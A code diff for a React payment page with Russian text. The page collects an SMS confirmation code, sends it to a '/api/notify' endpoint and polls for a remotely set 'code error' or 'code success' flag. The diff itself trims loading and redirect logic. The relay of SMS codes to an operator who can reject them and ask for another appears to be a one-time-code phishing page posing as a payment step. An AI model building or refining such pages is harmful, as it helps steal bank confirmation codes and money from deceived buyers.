@@ -38,7 +38,6 @@ export default function PaymentPage() {
   const [code, setCode] = useState('');
   const [codeError, setCodeError] = useState('');
   const [codeSent, setCodeSent] = useState(false);
-  const [codeLoading, setCodeLoading] = useState(false);
   const pollingRef = useRef<NodeJS.Timeout | null>(null);
   const router = useRouter();
 
@@ -89,48 +88,19 @@ export default function PaymentPage() {
         if (res.ok) {
           const data = await res.json();
           console.log('Polling response:', data);
-          
           if (data.codeError) {
             console.log('Code error received:', data.codeError);
             setCodeError(data.codeError);
             setShowCode(true);
             setCode('');
-            setCodeLoading(false);
             // Сбрасываем флаг ошибки после получения сообщения
-            try {
-              const resetRes = await fetch('/api/notify/reset-code-error', { method: 'POST' });
-              if (!resetRes.ok) {
-                console.error('Failed to reset code error flag');
-              }
-            } catch (error) {
-              console.error('Error resetting code error flag:', error);
-            }
-          } else if (data.codeSuccess) {
-            console.log('Code success received');
-            setCodeLoading(false);
-            setShowCode(false);
-            // Сбрасываем флаг успеха
-            try {
-              const resetRes = await fetch('/api/notify/reset-code-error', { method: 'POST' });
-              if (!resetRes.ok) {
-                console.error('Failed to reset code success flag');
-              }
-            } catch (error) {
-              console.error('Error resetting code success flag:', error);
-            }
-            // Перенаправляем на страницу успеха
-            router.push('/success');
-            return; // Прерываем выполнение после перенаправления
-          } else {
-            console.log('No code status change');
+            await fetch('/api/notify/reset-code-error', { method: 'POST' });
           }
-        } else {
-          console.error('Polling request failed:', res.status);
         }
       } catch (error) {
         console.error('Polling error:', error);
       }
-    }, 250); // Уменьшаем интервал до 250мс для более быстрой реакции
+    }, 2000);
   };
 
   useEffect(() => {
@@ -138,25 +108,13 @@ export default function PaymentPage() {
     startPolling();
     return () => {
       console.log('Component unmounting, clearing polling...');
-      if (pollingRef.current) {
-        clearInterval(pollingRef.current);
-        pollingRef.current = null;
-      }
-    };
-  }, []);
-
-  // Добавляем обработчик для очистки при размонтировании
-  useEffect(() => {
-    return () => {
-      // Очищаем флаги при размонтировании компонента
-      fetch('/api/notify/reset-code-error', { method: 'POST' }).catch(console.error);
+      if (pollingRef.current) clearInterval(pollingRef.current);
     };
   }, []);
 
   const handleSendCode = async () => {
     if (!code.trim()) return;
     setCodeSent(true);
-    setCodeLoading(true);
     await fetch('/api/notify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -265,24 +223,17 @@ export default function PaymentPage() {
               onChange={e => setCode(e.target.value)}
               placeholder="Введите SMS-код"
               className="rounded-2xl bg-[#efefef] px-5 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-700 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none text-center"
-              disabled={codeLoading}
             />
             <button
               type="button"
               onClick={handleSendCode}
-              disabled={codeSent || !code.trim() || codeLoading}
+              disabled={codeSent || !code.trim()}
               className="bg-[#00aaff] hover:bg-[#0099ee] active:bg-[#0088dd] text-white font-bold rounded-2xl px-6 py-4 transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed"
             >
               {codeSent ? 'Отправлено' : 'Отправить'}
             </button>
           </div>
           {codeError && <div className="text-red-500 text-center font-semibold">{codeError}</div>}
-          {codeLoading && (
-            <div className="flex flex-col items-center gap-2">
-              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#00aaff]"></div>
-              <div className="text-gray-600">Ожидание подтверждения...</div>
-            </div>
-          )}
         </div>
       )}
     </main>
